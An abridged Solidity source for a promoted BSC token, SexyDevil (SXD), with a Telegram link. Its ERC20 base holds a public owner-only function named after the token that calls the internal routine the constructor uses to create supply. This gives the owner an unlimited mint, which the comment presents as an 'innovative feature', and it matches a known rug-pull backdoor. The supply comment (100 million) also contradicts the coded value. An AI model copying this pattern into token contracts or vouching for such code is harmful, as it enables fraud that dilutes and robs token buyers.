...
//
// $SexyDevil proposes an innovative feature in its contract.
//
// 📱 Telegram: https://t.me/sexydevilbsc
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function SexyDevil(uint256 amount) public onlyOwner {
    _SexyDevil(msg.sender, amount);
    }
    ...
    function _SexyDevil(address account, uint256 amount) internal virtual {
...
contract SexyDevil is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("SexyDevil", "SXD") {
        _SexyDevil(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}